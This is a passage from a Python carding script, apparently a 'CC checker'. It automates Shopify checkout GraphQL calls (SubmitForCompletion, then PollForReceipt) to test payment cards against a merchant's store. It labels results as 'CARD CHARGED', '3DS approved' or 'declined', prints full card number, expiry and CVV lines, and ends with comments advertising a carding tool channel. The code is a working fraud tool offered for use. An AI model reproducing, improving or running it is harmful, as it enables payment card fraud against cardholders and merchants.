InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}',
                            'variables': {
                                'input': {
                                    'checkpointData': None,
                                    'sessionInput': {
                                        'sessionToken': session_token,
                                    },
                                    'queueToken': queue_token,
                                    'discounts': {
                                        'lines': [],
                                        'acceptUnexpectedDiscounts': True,
                                    },
                                    'delivery': {
                                        'deliveryLines': [
                                            {
                                                'selectedDeliveryStrategy': {
                                                    'deliveryStrategyMatchingConditions': {
                                                        'estimatedTimeInTransit': {'any': True},
                                                        'shipments': {'any': True},
                                                    },
                                                    'options': {},
                                                },
                                                'targetMerchandiseLines': {
                                                    'lines': [{'stableId': stable_id}],
                                                },
                                                'destination': {
                                                    'streetAddress': {
                                                        'address1': add1,
                                                        'address2': '',
                                                        'city': city,
                                                        'countryCode': 'US',
                                                        'postalCode': zip_code,
                                                        'company': '',
                                                        'firstName': fname,
                                                        'lastName': lname,
                                                        'zoneCode': state_short,
                                                        'phone': phone,
                                                    },
                                                },
                                                'deliveryMethodTypes': ['SHIPPING'],
                                                'expectedTotalPrice': {'any': True},
                                                'destinationChanged': True,
                                            },
                                        ],
                                        'noDeliveryRequired': [],
                                        'useProgressiveRates': False,
                                        'prefetchShippingRatesStrategy': None,
                                    },
                                    'merchandise': {
                                        'merchandiseLines': [
                                            {
                                                'stableId': stable_id,
                                                'merchandise': {
                                                    'productVariantReference': {
                                                        'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                                        'properties': [],
                                                        'sellingPlanId': None,
                                                        'sellingPlanDigest': None,
                                                    },
                                                },
                                                'quantity': {'items': {'value': 1}},
                                                'expectedTotalPrice': {'any': True},
                                                'lineComponentsSource': None,
                                                'lineComponents': [],
                                            },
                                        ],
                                    },
                                    'payment': {
                                        'totalAmount': {'any': True},
                                        'paymentLines': [
                                            {
                                                'paymentMethod': {
                                                    'directPaymentMethod': {
                                                        'paymentMethodIdentifier': paymentMethodIdentifier,
                                                        'sessionId': sessionid,
                                                        'billingAddress': {
                                                            'streetAddress': {
                                                                'address1': add1,
                                                                'address2': '',
                                                                'city': city,
                                                                'countryCode': 'US',
                                                                'postalCode': zip_code,
                                                                'company': '',
                                                                'firstName': fname,
                                                                'lastName': lname,
                                                                'zoneCode': state_short,
                                                                'phone': phone,
                                                            },
                                                        },
                                                        'cardSource': None,
                                                    },
                                                },
                                                'amount': {'any': True},
                                                'dueAt': None,
                                            },
                                        ],
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': add1,
                                                'address2': '',
                                                'city': city,
                                                'countryCode': 'US',
                                                'postalCode': zip_code,
                                                'company': '',
                                                'firstName': fname,
                                                'lastName': lname,
                                                'zoneCode': state_short,
                                                'phone': phone,
                                            },
                                        },
                                    },
                                    'buyerIdentity': {
                                        'buyerIdentity': {
                                            'presentmentCurrency': 'USD',
                                            'countryCode': 'US',
                                        },
                                        'contactInfoV2': {
                                            'emailOrSms': {
                                                'value': email,
                                                'emailOrSmsChanged': False,
                                            },
                                        },
                                        'marketingConsent': [{'email': {'value': email}}],
                                        'shopPayOptInPhone': {'countryCode': 'US'},
                                    },
                                    'tip': {'tipLines': []},
                                    'taxes': {
                                        'proposedAllocations': None,
                                        'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': 'USD'}},
                                        'proposedTotalIncludedAmount': None,
                                        'proposedMixedStateTotalAmount': None,
                                        'proposedExemptions': [],
                                    },
                                    'note': {'message': None, 'customAttributes': []},
                                    'localizationExtension': {'fields': []},
                                    'nonNegotiableTerms': None,
                                    'scriptFingerprint': {
                                        'signature': None,
                                        'signatureUuid': None,
                                        'lineItemScriptChanges': [],
                                        'paymentScriptChanges': [],
                                        'shippingScriptChanges': [],
                                    },
                                    'optionalDuties': {'buyerRefusesDuties': False},
                                },
                                'attemptToken': f'{token}-{random.random()}',
                                'metafields': [],
                                'analytics': {
                                    'requestUrl': f'{site_url}/checkouts/cn/{token}',
                                    'pageId': random_page_id,
                                },
                            },
                            'operationName': 'SubmitForCompletion',
                        }

                        graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
                        if graphql_response.status_code == 200:
                            result_data = graphql_response.json()
                            receipt_id = None
                            error_codes = []
                            
                            completion = result_data.get('data', {}).get('submitForCompletion', {})
                            
                            if completion.get('receipt'):
                                receipt_id = completion['receipt'].get('id')
                                print(f"✅ Receipt ID extracted: {receipt_id}")
                            
                            if completion.get('__typename') == 'Throttled':
                                print(" Throttled response detected - payment is being processed...")
                            
                            if completion.get('errors'):
                                errors = completion['errors']
                                error_codes = [e.get('code') for e in errors if 'code' in e]
                                print(f"⚠️{error_codes}")
                                

                                soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
                                

                                only_soft_errors = all(code in soft_errors for code in error_codes)
                                if only_soft_errors and attempt == 0:
                                    await asyncio.sleep(2)
                                    continue
                                
                                non_soft_errors = [code for code in error_codes if code not in soft_errors]
                                if non_soft_errors:
                                    print(f"❌ Payment Rejected")
                                    return
                            
                            if completion.get('reason'):
                                print(f"❌ Payment Failed: {completion['reason']}")
                                return
                            
                            if receipt_id:
                                print(f"Polling for receipt status...")
                                poll_payload = {
                                    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}analytics{checkoutCompletedEventId __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId customerOrdersCount eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsMarketing acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name deposit __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
                                    'variables': {
                                        'receiptId': receipt_id,
                                        'sessionToken': session_token,
                                    },
                                    'operationName': 'PollForReceipt'
                                }
                                
                                for poll_attempt in range(10):
                                    await asyncio.sleep(3)
                                    print(f"Poll attempt {poll_attempt + 1}/10...")
                                    poll_response = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)
                                    if poll_response.status_code == 200:
                                        poll_data = poll_response.json()
                                        receipt = poll_data.get('data', {}).get('receipt', {})
                                        
                                        if receipt.get('__typename') == 'ProcessedReceipt' or 'orderIdentity' in receipt:
                                            order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
                                            print(f"✅ CARD CHARGED!🔥 Order ID: {order_id}")
                                            return

                                        elif receipt.get('__typename') == 'ActionRequiredReceipt':
                                            print(f"✅ 3DS_SECURE(APPROVED)")
                                            print(f"📡 Full 3DS Response: {json.dumps(poll_data, indent=2)}")
                                            return

                                        elif receipt.get('__typename') == 'FailedReceipt':
                                            print(f"❌CARD_DECLINED")
                                            receipt = poll_data.get('data', {}).get('receipt', {})
                                            err_code = receipt.get('processingError', {}).get('code', 'UNKNOWN')
                                            receipt_id = receipt.get('id', 'NO_ID')

                                            print(f"{cc}|{mon}|{year}|{cvv} - {err_code} - {receipt_id}")
                                            return

                                        else:
                                            print(f"📡 Poll response (Typename: {receipt.get('__typename')}): {json.dumps(poll_data, indent=2)}")
                                break

                        else:
                            print(f"⚠️ GraphQL submission failed: {graphql_response.status_code}")
                            if attempt == 0:
                                await asyncio.sleep(2)
                                continue
                            return
                    
                    print("\n🔍 STEP 8: Checking final result...")
                    checkout_url_final = f"{site_url}/checkout?from_processing_page=1&validate=true"
                    final_response = await session.get(checkout_url_final)
                    final_url = str(final_response.url)
                    print(f"📍 Final URL: {final_url}")
                    
                    if "/thank" in final_url.lower() or "/orders/" in final_url:
                        print(f"💎ORDER CHARGED! Payment Successful! 💰")
                    else:
                        print(f"⚠️ Unknown Status - Manual check needed: {final_url}")

        except Exception as e:
            print(f"❌ An error occurred in main: {e}")

        except Exception as e:
            print(f"❌ An error occurred in main: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nInterrupted by user, exiting.")
#JOİNED FOR MORE CARDİNG TOOL CC CHECKER MORE
#@FTX_COURSE